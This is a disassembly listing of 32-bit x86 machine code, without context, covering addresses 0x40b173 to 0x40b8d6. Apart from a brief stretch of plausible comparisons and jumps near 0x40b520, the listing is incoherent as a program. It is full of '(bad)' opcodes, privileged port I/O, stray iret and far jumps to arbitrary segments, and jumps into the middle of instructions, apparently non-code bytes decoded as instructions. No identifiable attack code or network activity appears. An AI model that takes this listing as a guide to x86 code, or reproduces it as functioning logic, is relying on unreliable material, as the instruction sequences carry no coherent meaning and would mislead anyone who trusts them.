  40b173:	repz add cl,ch
  40b176:	sbb    al,0xa2
  40b178:	cli    
  40b179:	jo     0x40b1eb
  40b17b:	lahf   
  40b17c:	jge    0x40b1ee
  40b17e:	jo     0x40b1ae
  40b180:	iret   
  40b181:	pop    ss
  40b182:	ret    
  40b183:	test   BYTE PTR [esp+ebx*4+0xc],ch
  40b187:	mov    ebp,0x9d917897
  40b18c:	outs   dx,BYTE PTR ds:[esi]
  40b18d:	cmp    edi,DWORD PTR [esi-0xa]
  40b190:	inc    ebp
  40b191:	jno    0x40b143
  40b193:	inc    esp
  40b194:	mov    esi,DWORD PTR [edi-0xe43e020]
  40b19a:	sub    al,0xcf
  40b19c:	xor    eax,esp
  40b19e:	iret   
  40b19f:	mov    ebx,0x8cfe3b7b
  40b1a4:	es and al,0x87
  40b1a7:	int    0x17
  40b1a9:	loopne 0x40b1ef
  40b1ab:	cli    
  40b1ac:	les    eax,FWORD PTR ds:0x2456f446
  40b1b2:	loop   0x40b174
  40b1b4:	fstp   DWORD PTR [edx]
  40b1b6:	pop    es
  40b1b7:	add    eax,0x33701fbb
  40b1bc:	loope  0x40b1ee
  40b1be:	cmc    
  40b1bf:	mul    eax
  40b1c1:	or     al,0xef
  40b1c3:	fldenv [ecx+eax*4-0x63]
  40b1c7:	and    al,0xed
  40b1c9:	add    eax,0xca586189
  40b1ce:	dec    eax
  40b1cf:	sbb    bh,BYTE PTR [eax-0x1c3e9861]
  40b1d5:	lds    eax,FWORD PTR [ebx+0x28]
  40b1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1d9:	paddw  mm3,QWORD PTR [edi]
  40b1dc:	(bad)  
  40b1dd:	in     eax,dx
  40b1de:	imul   esi,DWORD PTR [eax-0x44],0xe60f5c5b
  40b1e5:	mov    ebp,0xbf8ddb98
  40b1ea:	cmp    BYTE PTR [ebp-0x2a],dh
  40b1ed:	enter  0xe03e,0xd5
  40b1f1:	pop    ds
  40b1f2:	sti    
  40b1f3:	test   BYTE PTR [edi+0x12],dl
  40b1f6:	pop    eax
  40b1f7:	and    ebx,DWORD PTR [edx+0x2805be40]
  40b1fd:	scas   al,BYTE PTR es:[edi]
  40b1fe:	addr16 pop esi
  40b200:	jmp    DWORD PTR [ebp+0xd]
  40b203:	mov    eax,0xc96f033f
  40b208:	jecxz  0x40b1b8
  40b20a:	mov    es,WORD PTR [esi-0x4920eb93]
  40b210:	out    dx,al
  40b211:	repnz loop 0x40b1d4
  40b214:	cs pop ds
  40b216:	cld    
  40b217:	scas   al,BYTE PTR es:[edi]
  40b218:	popa   
  40b219:	sub    dl,ah
  40b21b:	xor    ecx,ecx
  40b21d:	sbb    DWORD PTR [ebp+0x18de5f72],esi
  40b223:	icebp  
  40b224:	push   ecx
  40b225:	xchg   esi,eax
  40b226:	ror    ah,0x1a
  40b229:	sbb    esp,0x2b3edf13
  40b22f:	push   edx
  40b230:	mov    BYTE PTR [esi],0xe
  40b233:	cli    
  40b234:	adc    al,0xdf
  40b236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b237:	mov    cl,0x5a
  40b239:	lahf   
  40b23a:	sbb    ebp,ebp
  40b23c:	mov    ecx,0x4d806179
  40b241:	std    
  40b242:	sbb    al,0x16
  40b244:	pusha  
  40b245:	mov    bl,BYTE PTR [esi+0x1c9e2cc1]
  40b24b:	push   eax
  40b24c:	sub    eax,0xd9fb80f9
  40b251:	loope  0x40b291
  40b253:	fwait
  40b254:	ins    DWORD PTR es:[edi],dx
  40b255:	mov    edi,0xca376494
  40b25a:	test   DWORD PTR [esi],0x74d3b9ae
  40b260:	xor    eax,0xc517649f
  40b265:	(bad)  [esi]
  40b267:	test   eax,0xe51060b8
  40b26c:	push   0x38
  40b26e:	outs   dx,BYTE PTR ds:[esi]
  40b26f:	sub    ecx,DWORD PTR [edx+0xbfd8995]
  40b275:	(bad)  
  40b276:	xchg   ebp,eax
  40b277:	fnstsw WORD PTR ds:0xeaaba186
  40b27d:	or     edx,esp
  40b27f:	(bad)  
  40b280:	aam    0x61
  40b282:	add    BYTE PTR [edx+0x5b2280ab],dh
  40b288:	jp     0x40b264
  40b28a:	xchg   ebp,eax
  40b28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b28c:	dec    ebx
  40b28d:	xor    eax,0xe384eb42
  40b292:	test   al,0x18
  40b294:	nop
  40b295:	in     eax,0xc4
  40b297:	stos   BYTE PTR es:[edi],al
  40b298:	aas    
  40b299:	das    
  40b29a:	push   ss
  40b29b:	jne    0x40b309
  40b29d:	pop    DWORD PTR [eax+0x9]
  40b2a0:	cwde   
  40b2a1:	push   edi
  40b2a2:	dec    edi
  40b2a3:	imul   ebp,DWORD PTR [ebx],0x2d
  40b2a6:	jp     0x40b246
  40b2a8:	xor    DWORD PTR [edi-0x3d38d1a1],eax
  40b2ae:	xchg   ebx,eax
  40b2af:	and    DWORD PTR [ecx],ecx
  40b2b1:	call   0xd57b2a11
  40b2b6:	pop    ebp
  40b2b7:	les    edx,FWORD PTR [ecx-0x5b1eb077]
  40b2bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2be:	mov    edx,0x982893a9
  40b2c3:	pop    ecx
  40b2c4:	and    BYTE PTR [edi+0x7c70c2f3],al
  40b2ca:	inc    ecx
  40b2cb:	inc    eax
  40b2cc:	lods   eax,DWORD PTR ds:[esi]
  40b2cd:	xchg   ecx,eax
  40b2ce:	out    dx,eax
  40b2cf:	mov    esi,0x27752d3b
  40b2d4:	cmp    al,BYTE PTR [ebx+eax*8+0x30]
  40b2d8:	xchg   edx,eax
  40b2d9:	(bad)  
  40b2da:	dec    esp
  40b2db:	ds mov dl,0x4b
  40b2de:	rcr    BYTE PTR [ebx+eax*8-0xf08eafb],cl
  40b2e5:	pop    es
  40b2e6:	inc    edi
  40b2e7:	push   0xffffffaf
  40b2e9:	inc    eax
  40b2ea:	push   eax
  40b2eb:	iret   
  40b2ec:	sub    edi,ebx
  40b2ee:	mov    ah,0x1e
  40b2f0:	rol    DWORD PTR [ebp+0x45161a2e],0x68
  40b2f7:	xchg   esi,eax
  40b2f8:	sbb    bh,BYTE PTR ds:0xc8f7003d
  40b2fe:	(bad)  
  40b2ff:	jge    0x40b2ca
  40b301:	into   
  40b302:	cmp    eax,0xe9e1a62f
  40b307:	fiadd  WORD PTR [eax]
  40b309:	test   BYTE PTR [esi-0x60],bl
  40b30c:	xchg   edx,eax
  40b30d:	add    al,0xc4
  40b30f:	(bad)  
  40b310:	jnp    0x40b322
  40b312:	jmp    0x40b37a
  40b314:	dec    ecx
  40b315:	push   ebx
  40b316:	test   BYTE PTR ds:0x9dd7565d,bh
  40b31c:	sbb    bh,BYTE PTR [eax]
  40b31e:	dec    eax
  40b31f:	pop    ds
  40b320:	xchg   BYTE PTR ds:0xe5957d4c,ah
  40b326:	jno    0x40b317
  40b328:	cmp    BYTE PTR [ebp+0x47],ah
  40b32b:	fsubr  DWORD PTR [edx-0x5d87a36c]
  40b331:	ds ja  0x40b381
  40b334:	sub    dh,BYTE PTR [edi-0x3b]
  40b337:	mov    ah,0x4a
  40b339:	jge    0x40b365
  40b33b:	cmp    DWORD PTR [esi],ebx
  40b33d:	jbe    0x40b37e
  40b33f:	test   DWORD PTR [ebp+edi*2+0x5a],eax
  40b343:	loop   0x40b342
  40b345:	in     eax,0x5a
  40b347:	fistp  WORD PTR [ebp+0x1c113882]
  40b34d:	nop
  40b34e:	sbb    BYTE PTR [ebx],al
  40b350:	lock jnp 0x40b316
  40b353:	stc    
  40b354:	int3   
  40b355:	lods   ax,WORD PTR cs:[esi]
  40b358:	(bad)  
  40b359:	(bad)  
  40b35a:	out    dx,al
  40b35b:	pop    ecx
  40b35c:	xor    DWORD PTR [ecx+0x706b6d53],edx
  40b362:	jecxz  0x40b325
  40b364:	push   ebp
  40b365:	ins    BYTE PTR es:[edi],dx
  40b366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b367:	xchg   dh,dh
  40b369:	pop    es
  40b36a:	jp     0x40b320
  40b36c:	nop
  40b36d:	cmp    eax,0x3ce8d8b6
  40b372:	bound  ebp,QWORD PTR [eax-0x33]
  40b375:	push   cs
  40b376:	lods   al,BYTE PTR ds:[esi]
  40b377:	and    BYTE PTR [esi+0x51],al
  40b37a:	dec    esi
  40b37b:	loopne 0x40b3e9
  40b37d:	cmp    al,0x92
  40b37f:	out    dx,eax
  40b380:	xlat   BYTE PTR ds:[ebx]
  40b381:	sbb    ch,BYTE PTR [edx]
  40b383:	into   
  40b384:	and    edi,DWORD PTR ds:0x1c9d8ad4
  40b38a:	ficomp WORD PTR [edx]
  40b38c:	mov    bl,0x20
  40b38e:	and    cl,bh
  40b390:	inc    ecx
  40b391:	xor    DWORD PTR [eax],0x30
  40b394:	lea    edx,[eax+0x4b]
  40b397:	(bad)  
  40b398:	icebp  
  40b399:	fwait
  40b39a:	fs out dx,al
  40b39c:	and    cl,dl
  40b39e:	cli    
  40b39f:	fst    QWORD PTR [edx+esi*4+0x41]
  40b3a3:	cdq    
  40b3a4:	pop    ebp
  40b3a5:	aam    0xa6
  40b3a7:	stos   BYTE PTR es:[edi],al
  40b3a8:	pusha  
  40b3a9:	mov    esi,0xaf655ca
  40b3ae:	add    ebp,DWORD PTR [esi+ecx*4+0x6f]
  40b3b2:	lea    ebx,[edx]
  40b3b4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40b3b6:	pusha  
  40b3b7:	mov    edx,0x88d121ec
  40b3bc:	xor    DWORD PTR [eax+0x2100e34c],ebx
  40b3c2:	adc    eax,0x53523a4b
  40b3c7:	mov    BYTE PTR [edi],cl
  40b3c9:	ins    BYTE PTR es:[edi],dx
  40b3ca:	sbb    edx,eax
  40b3cc:	jp     0x40b42f
  40b3ce:	out    0x95,al
  40b3d0:	out    0x74,al
  40b3d2:	adc    esp,DWORD PTR [ecx]
  40b3d4:	mov    ?,WORD PTR [edx-0x4e]
  40b3d7:	data16 aam 0x6c
  40b3da:	add    ch,ch
  40b3dc:	or     ah,BYTE PTR [esi-0x66a03367]
  40b3e2:	and    ebx,DWORD PTR [ebx+0x7452a89c]
  40b3e8:	xchg   esi,eax
  40b3e9:	xlat   BYTE PTR ds:[ebx]
  40b3ea:	ins    BYTE PTR es:[edi],dx
  40b3eb:	dec    ecx
  40b3ec:	ret    0xad4c
  40b3ef:	js     0x40b468
  40b3f1:	iret   
  40b3f2:	inc    esi
  40b3f3:	mov    bh,BYTE PTR [esi+0x587e8b3b]
  40b3f9:	repnz mov ds:0x43fa5a3f,ax
  40b400:	enter  0x78a2,0x9b
  40b404:	push   esp
  40b405:	or     esp,DWORD PTR ds:0xd1bf1dd7
  40b40b:	pop    ebp
  40b40c:	mov    cl,0xd3
  40b40e:	(bad)  
  40b40f:	push   ss
  40b410:	xor    eax,0xa79e0789
  40b415:	imul   ebp,DWORD PTR [eax-0x5cce202f],0x18
  40b41c:	into   
  40b41d:	cli    
  40b41e:	push   0x16
  40b420:	xchg   ebx,eax
  40b421:	aam    0xc9
  40b423:	mov    al,0xfd
  40b425:	sub    al,0xc2
  40b427:	mov    al,ds:0xdcb5a085
  40b42c:	add    BYTE PTR [ebx],0xd3
  40b42f:	shr    DWORD PTR [edi-0xe],cl
  40b432:	dec    ebp
  40b433:	jbe    0x40b44c
  40b435:	jo     0x40b4a6
  40b437:	inc    esi
  40b438:	inc    ebp
  40b439:	pusha  
  40b43a:	xchg   ecx,eax
  40b43b:	sbb    BYTE PTR [ebp+0x59],0x57
  40b43f:	xor    eax,0x86079991
  40b444:	fwait
  40b445:	mov    al,ds:0x7a29464e
  40b44a:	and    DWORD PTR [ebp+0x55],eax
  40b44d:	sbb    DWORD PTR es:[esi+ebx*2],ebp
  40b451:	shl    dh,1
  40b453:	in     al,0xf2
  40b455:	sbb    eax,0x2c90c401
  40b45a:	xchg   BYTE PTR [esi-0x41],ch
  40b45d:	cmp    DWORD PTR [edi-0x7d],esi
  40b460:	mov    eax,0x579cbd91
  40b465:	hlt    
  40b466:	ret    0xed52
  40b469:	and    eax,ebx
  40b46b:	aas    
  40b46c:	lods   eax,DWORD PTR ds:[esi]
  40b46d:	xchg   edi,eax
  40b46e:	xlat   BYTE PTR ds:[ebx]
  40b46f:	pusha  
  40b470:	cmp    cl,bl
  40b472:	vpackssdw xmm5,xmm2,XMMWORD PTR [esi]
  40b476:	jne    0x40b496
  40b478:	xchg   ebp,eax
  40b479:	stos   DWORD PTR es:[edi],eax
  40b47a:	sbb    eax,0xdbaf89ab
  40b47f:	in     al,dx
  40b480:	push   ds
  40b481:	adc    esi,edx
  40b483:	xlat   BYTE PTR ds:[ebx]
  40b484:	adc    al,0x20
  40b486:	idiv   BYTE PTR [edx]
  40b488:	jns    0x40b4e3
  40b48a:	loopne 0x40b43e
  40b48c:	sub    eax,0xcbd46b65
  40b491:	dec    ebp
  40b492:	add    ebp,DWORD PTR [edx-0x2db99dec]
  40b498:	fist   WORD PTR [esi+0x472de3b7]
  40b49e:	lds    esi,FWORD PTR [edi-0x49e6de1b]
  40b4a4:	jmp    0x34e2:0xe8f946be
  40b4ab:	cli    
  40b4ac:	in     al,0xdc
  40b4ae:	jmp    0xd6a2a834
  40b4b3:	test   al,0xe2
  40b4b5:	daa    
  40b4b6:	test   al,0x33
  40b4b8:	jnp    0x40b45d
  40b4ba:	and    BYTE PTR [ecx],0xc7
  40b4bd:	sbb    DWORD PTR [eax+0x45],edx
  40b4c0:	aas    
  40b4c1:	shl    WORD PTR [ebx],1
  40b4c4:	and    DWORD PTR [esi-0x35],eax
  40b4c7:	mov    BYTE PTR [edi],dh
  40b4c9:	or     BYTE PTR [eax-0x433f10ba],0xe4
  40b4d0:	cmp    ebp,DWORD PTR [esi]
  40b4d2:	push   cs
  40b4d3:	inc    esp
  40b4d4:	dec    ecx
  40b4d5:	aas    
  40b4d6:	jbe    0x40b4f6
  40b4d8:	pcmpeqw mm6,QWORD PTR ds:0x24bcafb7
  40b4df:	imul   ebx,DWORD PTR [ecx+0x52],0xffffffc1
  40b4e3:	and    eax,0xff40afad
  40b4e8:	mov    ecx,0x165db026
  40b4ed:	aam    0x83
  40b4ef:	imul   ebp,DWORD PTR [eax-0x24],0xcec3bd40
  40b4f6:	data16 xchg BYTE PTR [esi-0x2d83acc4],ch
  40b4fd:	adc    al,0xa6
  40b4ff:	xchg   esp,eax
  40b500:	inc    edi
  40b501:	in     al,dx
  40b502:	and    edx,0xd57e36cf
  40b508:	test   al,0x22
  40b50a:	clc    
  40b50b:	and    al,0x11
  40b50d:	fcomp  DWORD PTR [ebx-0x6725025d]
  40b513:	cs cmp eax,0xf07f503a
  40b519:	psubw  mm7,QWORD PTR [ebx-0x2d5c24f4]
  40b520:	imul   edx,edi
  40b523:	mov    edi,DWORD PTR [ebp-0x8]
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	(bad)
  40b552:	mov    cl,0xc1
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b568
  40b55c:	dec    ebp
  40b55d:	fistp  QWORD PTR [edx+0x7abf9f49]
  40b563:	add    DWORD PTR [esi],ebx
  40b565:	push   esi
  40b566:	cmp    BYTE PTR [eax-0xc3a00a9],al
  40b56c:	adc    eax,DWORD PTR [edx+0x1e]
  40b56f:	inc    ecx
  40b570:	push   esi
  40b571:	lds    eax,FWORD PTR [ebx-0x57]
  40b574:	call   FWORD PTR [ecx+0x26]
  40b577:	add    BYTE PTR [edi+0x55a0a8b2],bl
  40b57d:	jl     0x40b544
  40b57f:	int    0xe5
  40b581:	adc    ah,BYTE PTR [ecx+eax*4-0x4731fd2c]
  40b588:	hlt    
  40b589:	ret    0x9bc7
  40b58c:	lods   eax,DWORD PTR ds:[esi]
  40b58d:	js     0x40b5c7
  40b58f:	int3   
  40b590:	es fdivr st,st(1)
  40b593:	ins    BYTE PTR es:[edi],dx
  40b594:	jmp    0x70912c31
  40b599:	cld    
  40b59a:	enter  0xd2c,0xc
  40b59e:	outs   dx,BYTE PTR ds:[esi]
  40b59f:	push   ebp
  40b5a0:	sahf   
  40b5a1:	mov    BYTE PTR ds:0xa8cb1851,dl
  40b5a7:	and    al,0x20
  40b5a9:	les    eax,FWORD PTR ds:0x15ca26e4
  40b5af:	pop    eax
  40b5b0:	loope  0x40b586
  40b5b2:	not    BYTE PTR [ebp+0x1b]
  40b5b5:	(bad)  
  40b5b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5b8:	and    DWORD PTR [ebx+0x8],0x34b5454b
  40b5bf:	stc    
  40b5c0:	stc    
  40b5c1:	dec    eax
  40b5c2:	stc    
  40b5c3:	mov    bl,0xfd
  40b5c5:	inc    ebp
  40b5c6:	xor    al,0x81
  40b5c8:	push   ss
  40b5c9:	fbstp  TBYTE PTR [edi+edi*2+0x554d5e90]
  40b5d0:	inc    ebx
  40b5d1:	mov    al,0xf1
  40b5d3:	xor    BYTE PTR [esi+eax*8-0x6],bh
  40b5d7:	and    eax,0xd99d1247
  40b5dc:	and    esi,DWORD PTR [edi-0x4b33be86]
  40b5e2:	sbb    dl,BYTE PTR [eax+0x1a]
  40b5e5:	mov    edi,0x4b0c70cb
  40b5ea:	popa   
  40b5eb:	jne    0x40b5ca
  40b5ed:	pop    ebx
  40b5ee:	int3   
  40b5ef:	sbb    eax,0xebed0161
  40b5f4:	mov    ah,0x1
  40b5f6:	pop    eax
  40b5f7:	mov    ch,0x3
  40b5f9:	in     eax,0xad
  40b5fb:	in     al,0xe9
  40b5fd:	mov    bh,0x51
  40b5ff:	jecxz  0x40b629
  40b601:	mov    ebp,0xb5c9bc14
  40b606:	or     ecx,edx
  40b608:	js     0x40b5d6
  40b60a:	push   cs
  40b60b:	cli    
  40b60c:	jae    0x40b602
  40b60e:	xchg   esi,eax
  40b60f:	call   0x13fcda87
  40b614:	lods   al,BYTE PTR ds:[esi]
  40b615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b616:	aad    0xc6
  40b618:	add    eax,0x6e13a309
  40b61d:	popf   
  40b61e:	jmp    0x1b2eb422
  40b623:	sub    dl,BYTE PTR [ebx]
  40b625:	pop    esp
  40b626:	xor    al,0xc1
  40b628:	cld    
  40b629:	and    DWORD PTR [ebx],ecx
  40b62b:	xor    cl,BYTE PTR [edx-0x545534ed]
  40b631:	xchg   edi,eax
  40b632:	icebp  
  40b633:	xchg   edi,eax
  40b634:	out    dx,al
  40b635:	xor    DWORD PTR [edx],edx
  40b637:	pusha  
  40b638:	pusha  
  40b639:	rcl    BYTE PTR [edx-0x76],cl
  40b63c:	les    edi,FWORD PTR [edx]
  40b63e:	fs aas 
  40b640:	xor    ecx,eax
  40b642:	sbb    DWORD PTR [edi-0x30],edx
  40b645:	dec    esi
  40b646:	add    edi,edi
  40b648:	sahf   
  40b649:	test   esp,ecx
  40b64b:	nop
  40b64c:	jne    0x40b5f9
  40b64e:	(bad)  
  40b64f:	add    BYTE PTR [ecx+edx*8],0x77
  40b653:	xchg   ecx,eax
  40b654:	mov    edx,0xc813bbcb
  40b659:	shl    ebp,0x88
  40b65c:	xor    ebp,DWORD PTR [ecx+0x41a86b33]
  40b662:	adc    edx,edx
  40b664:	cmp    esi,DWORD PTR cs:[ecx+0x5e]
  40b668:	xlat   BYTE PTR ds:[ebx]
  40b669:	xchg   ebx,eax
  40b66a:	enter  0xd094,0xa
  40b66e:	mov    esi,0xea89e17c
  40b673:	mov    gs,WORD PTR [esi+0x3d]
  40b676:	jb     0x40b64b
  40b678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b679:	jmp    0x76ee6968
  40b67e:	bound  ecx,QWORD PTR [edx]
  40b680:	xor    esp,edi
  40b682:	ret    0x818f
  40b685:	hlt    
  40b686:	or     eax,0xe7084a7a
  40b68b:	cmp    DWORD PTR [ecx-0x3f355ff0],ecx
  40b691:	jle    0x40b616
  40b693:	xchg   DWORD PTR [eax],eax
  40b695:	mov    ebp,DWORD PTR [edx-0x18]
  40b698:	imul   esi,DWORD PTR [edi-0x5760b902],0x4f
  40b69f:	xor    BYTE PTR [edi],bl
  40b6a1:	mov    ah,0x8c
  40b6a3:	lahf   
  40b6a4:	outs   dx,BYTE PTR ds:[esi]
  40b6a5:	in     eax,dx
  40b6a6:	cld    
  40b6a7:	push   edi
  40b6a8:	(bad)  
  40b6a9:	sahf   
  40b6aa:	mov    fs,WORD PTR [ebx]
  40b6ac:	push   ecx
  40b6ad:	jp     0x40b6d5
  40b6af:	add    edi,esi
  40b6b1:	xchg   edi,eax
  40b6b2:	push   edi
  40b6b3:	out    dx,al
  40b6b4:	popf   
  40b6b5:	pop    esi
  40b6b6:	adc    eax,esp
  40b6b8:	loopne 0x40b710
  40b6ba:	cmp    DWORD PTR [eax],esi
  40b6bc:	inc    ebx
  40b6bd:	mov    ecx,0xbe8858a0
  40b6c2:	(bad)  
  40b6c3:	xor    eax,0x44d8cb4
  40b6c8:	mov    esp,0x37c0bf1
  40b6cd:	in     al,dx
  40b6ce:	or     DWORD PTR [eax],ecx
  40b6d0:	xchg   ecx,eax
  40b6d1:	out    dx,al
  40b6d2:	into   
  40b6d3:	repnz gs xor al,0xe0
  40b6d7:	push   esp
  40b6d8:	inc    edi
  40b6d9:	outs   dx,BYTE PTR ds:[esi]
  40b6da:	rcr    DWORD PTR [edi+0x7a],0x18
  40b6de:	cs ja  0x40b6e3
  40b6e1:	div    DWORD PTR [ecx+0x3c8441d0]
  40b6e7:	jl     0x40b6ee
  40b6e9:	mov    edi,0x2f9b999a
  40b6ee:	test   al,0xed
  40b6f0:	aaa    
  40b6f1:	jmp    0x3fc5:0xe1a44d
  40b6f8:	lods   eax,DWORD PTR ds:[esi]
  40b6f9:	lea    ecx,[eax+edi*8-0x42]
  40b6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6fe:	mov    dl,0xfc
  40b700:	cmp    al,0x33
  40b702:	stc    
  40b703:	push   es
  40b704:	mov    ch,0xeb
  40b706:	mov    cl,0x1a
  40b708:	icebp  
  40b709:	adc    dh,bh
  40b70b:	std    
  40b70c:	push   DWORD PTR [ecx+0x34]
  40b70f:	or     cl,BYTE PTR [esi+0x6e]
  40b712:	lea    ebp,[esi-0x7e]
  40b715:	dec    esi
  40b716:	cmc    
  40b717:	repnz (bad) 
  40b719:	and    bl,bh
  40b71b:	fwait
  40b71c:	or     ecx,DWORD PTR [ebp-0x487c6880]
  40b722:	push   ebx
  40b723:	jno    0x40b776
  40b725:	mov    cl,BYTE PTR [edx+0x13]
  40b728:	dec    ebp
  40b729:	shl    DWORD PTR [eax],1
  40b72b:	sbb    al,0x71
  40b72d:	mov    edx,0xac7ac48e
  40b732:	imul   edx,DWORD PTR [eax],0xe9b45429
  40b738:	push   esp
  40b739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b73a:	jbe    0x40b73b
  40b73c:	cdq    
  40b73d:	add    DWORD PTR [esp+eax*1-0x744c0cce],ebx
  40b744:	inc    edi
  40b745:	aam    0x66
  40b747:	add    DWORD PTR [edx+esi*1+0x64d5e9f0],ecx
  40b74e:	jmp    0x796d:0xa1428870
  40b755:	pop    ebp
  40b756:	mov    dh,0xa5
  40b758:	fwait
  40b759:	stc    
  40b75a:	rcr    ebx,0xa5
  40b75d:	mov    bl,0xb4
  40b75f:	lock mov sp,WORD PTR es:[eax]
  40b764:	retf   0x3548
  40b767:	mov    eax,ds:0xa141e9dc
  40b76c:	clc    
  40b76d:	(bad)  
  40b76e:	cld    
  40b76f:	xor    DWORD PTR [esi-0x12],ebx
  40b772:	xchg   esp,eax
  40b773:	cdq    
  40b774:	fiadd  WORD PTR [ecx]
  40b776:	mov    ebx,0xc2b84742
  40b77b:	clc    
  40b77c:	pop    edx
  40b77d:	and    al,0x29
  40b77f:	ja     0x40b777
  40b781:	hlt    
  40b782:	sub    al,ch
  40b784:	xchg   esi,eax
  40b785:	ret    
  40b786:	in     eax,dx
  40b787:	(bad)  
  40b788:	sbb    DWORD PTR [eax+0x175a8c1b],edx
  40b78e:	neg    DWORD PTR [esi+0x2b]
  40b791:	push   cs
  40b792:	sar    DWORD PTR [esi+esi*2+0x60f7d96],0xdd
  40b79a:	dec    esi
  40b79b:	jmp    0xbba4:0xe2f8b22d
  40b7a2:	(bad)  
  40b7a3:	ror    BYTE PTR [ebp-0x4438a3ab],0x2e
  40b7aa:	imul   esp,DWORD PTR [ebx],0xb5e4390e
  40b7b0:	jns    0x40b7cd
  40b7b2:	push   edx
  40b7b3:	and    al,BYTE PTR [edx]
  40b7b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7b6:	aad    0xda
  40b7b8:	mov    DWORD PTR [eax-0x1f7349d2],edi
  40b7be:	(bad)  
  40b7bf:	std    
  40b7c0:	shl    edi,1
  40b7c2:	lahf   
  40b7c3:	cmp    eax,0x71cb880a
  40b7c8:	jne    0x40b7ab
  40b7ca:	out    dx,eax
  40b7cb:	(bad)
  40b7ce:	into   
  40b7cf:	adc    eax,0x397e297c
  40b7d4:	dec    ebx
  40b7d5:	sub    BYTE PTR [ecx+0x738e162a],bl
  40b7db:	(bad)  
  40b7dd:	xchg   esi,eax
  40b7de:	xchg   ecx,eax
  40b7df:	jl     0x40b856
  40b7e1:	cmp    DWORD PTR [edi],0xfffffff8
  40b7e4:	pop    ebx
  40b7e5:	sbb    ecx,DWORD PTR [ebx]
  40b7e7:	inc    ebp
  40b7e8:	dec    BYTE PTR [edi+ebp*2+0x3f]
  40b7ec:	push   0xabb1ea96
  40b7f1:	sbb    eax,DWORD PTR [esi]
  40b7f3:	cmp    DWORD PTR [ebp+0x66],edi
  40b7f6:	cmp    DWORD PTR [edi+0x3d],esi
  40b7f9:	cmc    
  40b7fa:	cmp    edi,edx
  40b7fc:	mov    DWORD PTR [esi],esp
  40b7fe:	out    dx,eax
  40b7ff:	xor    eax,0x457700f3
  40b804:	aad    0x7f
  40b806:	xchg   ebx,eax
  40b807:	aas    
  40b808:	outs   dx,BYTE PTR ds:[esi]
  40b809:	sub    al,0x8
  40b80b:	push   cs
  40b80c:	retf   
  40b80d:	jmp    0x40b7c3
  40b80f:	retf   
  40b810:	xor    esp,edx
  40b812:	retf   
  40b813:	dec    edx
  40b814:	pop    ebx
  40b815:	imul   edi,DWORD PTR [ebx-0x5a134e3f],0x6b
  40b81c:	lods   eax,DWORD PTR ds:[esi]
  40b81d:	stc    
  40b81e:	mov    edx,0x52d587be
  40b823:	aad    0xbe
  40b825:	and    ebx,ecx
  40b827:	(bad)  
  40b828:	ds mov ?,edx
  40b82b:	push   ebx
  40b82c:	inc    esp
  40b82d:	or     dh,BYTE PTR fs:[esi+0x26]
  40b831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b832:	mov    ds:0xc19f04aa,al
  40b837:	xlat   BYTE PTR ds:[ebx]
  40b838:	daa    
  40b839:	inc    edx
  40b83a:	enter  0x4103,0xb3
  40b83e:	sbb    eax,0x200f499d
  40b843:	(bad)  
  40b844:	fcmovnbe st,st(0)
  40b846:	bnd ja 0x40b851
  40b849:	in     al,0x1b
  40b84b:	push   ds
  40b84c:	push   0x1ad3e623
  40b851:	inc    esp
  40b852:	xchg   esi,eax
  40b853:	and    cl,BYTE PTR [edx-0xb]
  40b856:	xor    ah,BYTE PTR [bp+si+0x6412]
  40b85b:	in     al,dx
  40b85c:	fs jmp 0xeeb7:0x323af9b
  40b864:	push   ds
  40b865:	sbb    al,0x60
  40b867:	lahf   
  40b868:	inc    esp
  40b869:	rcl    DWORD PTR [edx-0x594b5c6f],1
  40b86f:	enter  0x1613,0xe3
  40b873:	lock in eax,0x57
  40b876:	sbb    eax,DWORD PTR [edx-0x33b97db2]
  40b87c:	pushf  
  40b87d:	in     al,0x5d
  40b87f:	lods   eax,DWORD PTR ds:[esi]
  40b880:	fist   DWORD PTR [edi+0x5030ac5c]
  40b886:	scas   al,BYTE PTR es:[edi]
  40b887:	daa    
  40b888:	pusha  
  40b889:	jle    0x40b8a9
  40b88b:	cmp    al,0xb3
  40b88d:	pop    ds
  40b88e:	(bad)  
  40b88f:	add    esi,DWORD PTR [ebp-0x1]
  40b892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b893:	(bad)  
  40b894:	and    al,0x11
  40b896:	push   esp
  40b897:	scas   al,BYTE PTR es:[edi]
  40b898:	cli    
  40b899:	mov    ds:0x380b464d,al
  40b89e:	ja     0x40b854
  40b8a0:	jle    0x40b911
  40b8a2:	enter  0x9e1a,0x9c
  40b8a6:	imul   eax,ebp,0xdc70edeb
  40b8ac:	sar    DWORD PTR [edi-0x66],cl
  40b8af:	call   0x93e7:0x35637593
  40b8b6:	mov    ds:0x3dd407ff,eax
  40b8bb:	jmp    0x3aa2:0x437653c1
  40b8c2:	mov    ss,WORD PTR ds:0x28e5faaf
  40b8c8:	sub    eax,0xdce8cb4f
  40b8cd:	in     eax,0xdf
  40b8cf:	in     al,dx
  40b8d0:	mov    WORD PTR [ebx+0x7858f13d],ds
  40b8d6:	test   DWORD PTR [esi-0x18],ebx
